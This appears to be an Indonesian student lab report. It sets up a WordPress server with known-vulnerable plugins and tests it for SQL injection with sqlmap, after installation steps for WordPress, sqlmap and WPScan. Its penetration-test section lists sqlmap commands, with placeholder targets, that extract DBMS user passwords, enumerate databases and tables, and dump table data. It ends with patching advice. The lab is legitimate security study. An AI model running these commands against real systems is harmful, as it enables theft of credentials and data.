##Pendahuluan

##Dasar Teori
###Sistem Operasi yang Digunakan
####1. Ubuntu 14.04.2 (Server Version)
Ubuntu Server adalah salah satu varian dari distro linux Ubuntu yang didesain untuk diinstall di server. Ubuntu Server tidak menyediakan GUI, yang ada hanya CLI (Comand Line Interface). Ubuntu Server digunakan untuk menangani memori sampai puluhan Giga ataupun menangani Multicore CPU.

####2. Ubuntu 15.10 (Desktop Version)
Ubuntu 15.10 (Willy Werewolf) merupakan salah satu versi dari ubuntu yang diluncurkan pada publik tanggal 22 Oktober 2015. 

####3. Wordpress 3.8.5
WordPress adalah sebuah aplikasi sumber terbuka (open source) yang sangat populer digunakan sebagai mesin blog (blog engine). WordPress dibangun dengan bahasa pemrograman PHP dan basis data (database) MySQL. PHP dan MySQL, keduanya merupakan perangkat lunak sumber terbuka (open source software).

####4. Spider Video Player 1.5.16
Spider Video Player adalah salah satu plugin WordPress terbaik untuk menambah video di website. Spider Video Player dapat mengorganisir video-video ke dalam sebuah playlist dan memungkinkan pengguna untuk memilih layout yang diinginkan. Spider Video Player menyediakan user interface yang mudah, dan menggabungkan semua fitur yang umum untuk pemutar video yaitu pilihan kualitas video, sharing, full screen, shuffle dan lain-lain.

####5. League Manager 3.9.1.1
League Manager adalah sebuah plugin WordPress untuk mengelola suatu liga olahraga dan menampilkannya di website.

####6. SQLMap
Sqlmap adalah tools opensource yang mendeteksi dan melakukan exploit pada bug SQL injection secara otomatis. dengan melakukan serangan SQL injection seorang attacker dapat mengambil alih serta memanipulasi sebuah database di dalam sebuah server.

####7. WPScan
WPScan adalah scanner keamanan yang memeriksa keamanan WordPress menggunakan metode “black box”.
Fitur utama: pencacah username, multithreaded password bruteforcing, pencacah versi plugin WordPress dan pencacahan kerentanan sistem.
Disini kita akan menunjukkan bagaimana melakukan audit keamanan pada installasi WordPress dengan nama pengguna “mike” yang memiliki password lemah dan menggunakan blog plugin yang rentan.

##Instalasi Wordpress
Sebelum memulai menginstal wordpress, kami menginstal DBMS MySQL terlebih dahulu. Kemudian kami membuat database di MySQL untuk wordpress bernama "wordpress".<br/>
![](images/1_create_database.PNG?raw=true)<br/>
Mulai menginstall wordpress dengan mengetikkan syntax sudo apt-get install wordpress<br/>
![](images/2_install_wordpress.PNG?raw=true)<br/>
Setelah wordpress tterinstall, lakukan konfigurasi wordpress melalui browser <br/>
![](images/3_configure_wordpress_in_browser.png?raw=true)<br/>
Konfigurasi wordpress juga dilakukan pada file /etc/apache2/sites-available/wordpress.conf sesuai gambar di bawah ini<br/>
![](images/3_1_wordpress_conf.PNG?raw=true)<br/>
Buat file konfigurasi di directory /etc/wordpress dengan nama file config-[domain].php sesuai gambar di bawah ini<br/>
![](images/3_2_config_ipwordpress_php.PNG?raw=true)<br/>
Setelah sukses melakukan instalasi wordpress maka kita akan diminta untuk memasukkan username dan pasword untuk bisa login ke wordpress melalui browser<br/>
![](images/4_success_install_wordpress.png?raw=true)<br/>
Untuk dapat login sebagai admin ketikkan, domain_ip/wordpress/wp-login.php<br/>
![](images/login wordpress1.png?raw=true)<br/>
Kemudian akan muncul tampilan dasboard admin sebagai berikut<br/>
![](images/dashboard.png?raw=true)<br/>

##Instalasi Plugin
Untuk menginstall plugin, klik plugins<br/>
![](images/plugins.png?raw=true)<br/>
Untuk menambahkannya klik add new<br/>
![](images/plugins add.png?raw=true)<br/>
Cari plugin yang akan diinstall<br/>
![](images/plugins search.png?raw=true)<br/>
Ketika sudah menemukan plugin yang dinginkan, klik install<br/>
![](images/install plugin.png?raw=true)<br/>
Untuk mengetahui plugin apa saja yang telah terinstall klik installed plugins<br/>
![](images/plugins view.png?raw=true)<br/>

Pada tugas ini, kami menginstall video player 1.5.18 yang vulnerability-nya telah diketahui.<br/>

##Instalasi Tools SQL Injection
UNtuk menginstall sqlmap download tarball dengan syntax wget "https://github.com/sqlmapproject/sqlmap/tarball/master" --output-document=sqlmapproject-sqlmap-0.9-3671-gdcaad75.tar.gz. Setelah berhasil mendownload tarball, lakukan ekstrasi<br/>
![](images/7_install_sqlmap_step1.png?raw=true)<br/>
Untuk menjalankan SQLmap masuk ke folder sqlmap sebagai root kemudian ketikkan perintah python sqlmap.py --version. SQLmap siap digunakan<br/>
![](images/8_install_sqlmap_step2.png?raw=true)<br/>
Untuk menginstal wpscan download beberapa library yang dibutuhkan. Lakukan command line seperti di bawah ini<br/>
> apt-get install libcurl4-gnutls-dev libopenssl-ruby libxml2 libxml2-dev libxslt1-dev ruby-dev<br/>

> git clone https://github.com/wpscanteam/wpscan.git<br/>

> cd wpscan<br/>

> sudo gem install bundler && bundle install --without test development<br/>

![](images/6_install_wpscan_step2.png?raw=true)<br/>

##Uji Penetrasi SQL Injection
Uji penetrasi hanya bisa dilakukan dengan sqlmap, sedangkan wpscan tidak bisa. Hal ini dikarenakan versi ruby dari pc penetrasi tidak support dengan wpscan. Namun ketika mencoba mengupadate ruby, hasilnya eror.

Untuk mengetahui password dari databse wordpress ketikkan syntax:
> python sqlmap.py -u "[domainip/alamatwordpress]" --batch --password <br/>

maka akan keluar password dari setiap user di dbms server. 

Untuk mengetahui database yang ada di server ketikkan syntax:
> python sqlmap.py -u "[domainip/alamatwordpress]" --batch --dbs <br/>

maka akan keluar database yang berada di server.

Untuk mengetahui tabel apasaja yang ada di suatu database ketikkan syntax:
> python sqlmap.py -u "[domainip/alamatwordpress]" --batch --tables -D [namadatabase] <br/>

maka akan keluar tabel pada suatu database yang berada di server.

Untuk mmengambil data dari server kita dapat melakukan dumping file dengan mengetikkan syntax:
> python sqlmap.py -u "[domainip/alamatwordpress]" --batch --dump -T [namatabel] <br/>



##Kesimpulan dan Saran
####Kesimpulan:
- sqlmap dan wpscan digunakan untuk melakukan penerasi sqlinjection
- Jika menggunakan kali linux maka tidak perlu melakukan instalasi di atas. Namun beberapa konfigurasi dan setting perlu dilakukan apabila tiddak menggunakan kali linux
- Beberapa plugin pada wordpress dapat menyebabkan vulnerability pada server wordpress dan menyebabkan lebih mudah diserang

####Saran:
- Untuk menjaga keamanan data pada server wordpress, administrator sebaiknya menggunakan lastest update version dari plugin yang akan digunakan pada wordpress sehingga tingkat keamanannya lebih terjamin
- Penggunaan sqlmap untuk menyerang vulnerability dari wordpress dapat dieksplor lebih dalam



